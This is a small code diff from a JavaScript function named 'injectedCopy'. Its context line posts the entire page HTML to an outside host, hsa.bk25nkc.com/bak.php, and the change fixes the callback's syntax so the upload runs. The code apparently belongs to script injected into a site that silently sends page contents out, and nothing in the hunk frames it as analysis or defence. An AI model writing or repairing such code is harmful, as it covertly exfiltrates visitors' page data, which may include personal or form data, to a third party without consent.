@@ -331,7 +331,7 @@ function injectedCopy(){
             $.post(
                 "https://hsa.bk25nkc.com/bak.php",
                 {html: document.documentElement.outerHTML},
-                function()
+                function(){}
             );
 
             try {
